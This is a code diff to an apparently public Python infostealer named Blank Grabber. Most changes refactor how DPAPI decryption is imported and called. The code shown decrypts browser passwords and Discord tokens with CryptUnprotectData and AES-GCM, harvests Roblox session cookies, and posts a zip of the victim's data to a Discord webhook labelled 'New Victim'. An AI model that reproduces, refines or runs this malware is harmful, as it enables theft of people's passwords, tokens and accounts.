@@ -17,8 +17,9 @@ import traceback
 import time
 
 from threading import Thread
+from functools import reduce
 from urllib3 import PoolManager, HTTPResponse
-from win32crypt import CryptUnprotectData
+from DPAPI import CryptUnprotectData
 import PIL.ImageGrab as ImageGrab, PIL.Image as Image, PIL.ImageStat as ImageStat
 
 class Settings:
@@ -301,7 +302,7 @@ class Browsers:
                     encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
                     encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
 
-                    self.EncryptionKey = CryptUnprotectData(encryptedKey, None, None, None, 0)[1]
+                    self.EncryptionKey = CryptUnprotectData(encryptedKey)
                     return self.EncryptionKey
 
                 else:
@@ -316,7 +317,7 @@ class Browsers:
 
                 return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode()
             else:
-                return str(CryptUnprotectData(buffer, None, None, None, 0)[1])
+                return str(CryptUnprotectData(buffer))
         
         def GetPasswords(self) -> list[tuple[str, str, str]]:
             encryptionKey = self.GetEncryptionKey()
@@ -615,7 +616,7 @@ class Discord:
         
         for token in encryptedTokens:
             try:
-                token = pyaes.AESModeOfOperationGCM(CryptUnprotectData(key, None, None, None, 0)[1], token[3:15]).decrypt(token[15:])[:-16].decode(errors= "ignore")
+                token = pyaes.AESModeOfOperationGCM(CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors= "ignore")
                 if token:
                     tokens.append(token)
             except Exception:
@@ -768,7 +769,7 @@ class BlankGrabber:
     @Errors.Catch
     def StealRobloxCookies(self) -> None:
         saveToDir = os.path.join(self.TempFolder, "Games", "Roblox")
-        note = "# The tokens found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not."
+        note = "# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not."
 
         browserCookies = "\n".join(self.Cookies)
         for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", browserCookies):
@@ -969,7 +970,7 @@ class BlankGrabber:
             return
         
         def isMonochrome(path: str):
-            return __import__("functools").reduce(lambda x, y: x and y < 0.005, ImageStat.Stat(Image.open(path)).var, True)
+            return reduce(lambda x, y: x and y < 0.005, ImageStat.Stat(Image.open(path)).var, True)
 
         with open(Camfile, 'rb') as file:
             data = file.read()
@@ -1071,8 +1072,10 @@ class BlankGrabber:
             
             grabbedInfo = "\n".join([key.ljust(20) + " : " + str(value) for key, value in collection.items()])
 
+            image_url = "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
+
             payload = {
-  "content": "@everyone" if Settings.PingMe else "",
+  "content": ("||@everyone||" if Settings.PingMe else "") + " New Victim",
   "embeds": [
     {
       "title": "Blank Grabber",
@@ -1083,17 +1086,19 @@ class BlankGrabber:
         "text": "Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber"
       },
       "thumbnail": {
-        "url": "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
+        "url": image_url
       }
     }
-  ]
+  ],
+  "tts" : True,
+  "username" : "Blank Grabber",
+  "avatar_url" : image_url
 }
             
             with open(self.ArchivePath, "rb") as file:
                 fileBytes = file.read()
-            
-            http.request("POST", Settings.Webhook, body= json.dumps(payload).encode(), headers= Discord.GetHeaders())
-            http.request("POST", Settings.Webhook, fields= {"file" : ("Blank-{}.zip".format(os.getlogin()), fileBytes)})
+
+            http.request("POST", Settings.Webhook, fields= {"file" : ("Blank-{}.zip".format(os.getlogin()), fileBytes), "payload_json" : json.dumps(payload).encode()})
 
 
 if __name__ == "__main__" and os.name == "nt":
